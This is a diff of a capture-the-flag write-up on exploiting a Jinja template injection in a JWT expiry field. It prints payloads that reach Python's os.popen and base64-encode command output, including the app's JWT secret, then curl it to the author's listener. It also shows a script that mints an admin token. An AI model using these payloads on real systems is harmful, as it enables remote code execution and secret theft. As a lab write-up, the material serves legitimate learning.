@@ -1,4 +1,5 @@
 # Secure Rendered JWT – Writeup
+
 ![Challenge](./pictures/aa.png)
 
 
@@ -43,6 +44,12 @@ Since quoted Norwegian numbers were mapped to minutes, I tried a Jinja inline if
 'en' if <condition> else 'to'
 ```
 If true, the token had 1 minute on the expiration, if false, 2 minutes. That meant I could test arbitrary conditions without crashing.
+
+I checked whether it had 1 or 2 minutes from expiring using jwt.io
+
+![Challenge](./pictures/jwt.png)
+
+
 The first big reveal:
 
 ```
@@ -58,6 +65,8 @@ Inside globals, you can grab __builtins__.
 Then you can reach __import__.
 
 It returned 1, so the template could reach Python builtins.
+
+---
 
 Next, import os (the os module gives direct access to the filesystem, environment variables, and command execution):
 
@@ -82,7 +91,10 @@ Check for command execution
 These all returned 1, so I had everything I needed.
 RCE and Exfil.
 
+---
+
 Dumping big strings into the minutes field would crash, so the plan was to run a command server side and send the result over HTTP to my own listener.
+
 On my Mac, I used netcat.
 
 To avoid spaces, quotes, and newlines breaking the request path, I base64-encoded on the server before curling home. Example pattern:
@@ -90,12 +102,16 @@ To avoid spaces, quotes, and newlines breaking the request path, I base64-encode
 bash -c 'echo "hello" | base64 | xargs -I{} curl http://ip:port/{}'
 ```
 
-Inside the minute field, that becomes:
+Inside the minute field, I put it in as:
 ```
 'en' if cycler.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'echo hello | base64 | xargs -I{} curl ip:port'") else 'to'
 ```
 
-The listener saw GET /aGVsbG8K HTTP/1.1, I decoded locally with base64 -d.
+My listener received an HTTP GET request containing the base64-encoded result, which I then decoded locally with base64 -d.
+
+---
+
+## Dead end 
 
 Here I fell into a rabbit hole.
 
@@ -113,8 +129,10 @@ I proved I could pull the live secret over the same exfil route:
 ```
 'en' if cycler.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'python3 -c \"import app; print(app.JWT_SECRET)\" | base64 | xargs -I{} curl http://ip:port/{}'") else 'to'
 ```
+
 The listener received a base64 blob, which decoded to the current 64 hex key.
 I minted an admin token with PyJWT:
+
 ```
 import jwt, time
 secret = "6318ccead28b8819fe24e43b5d971613dee6b7ae83ee414df99167f19"  # example pulled live
@@ -122,8 +140,13 @@ payload = {"username": "admin", "admin": True, "exp": int(time.time()) + 3600}
 token = jwt.encode(payload, secret, algorithm="HS256")
 print(token)
 ```
+---
 
 Replacing the cookie crashed with 500. When it crashed, the box had restarted and the secret had rotated, so the token was now invalid. Essentially I had gotten something that I could've just done with jwt.io, so I figured this wasn't the intended way. 
+
+---
+
+## Getting the flag
 
 I tried listing the files that exist to see if there was a different path.
 
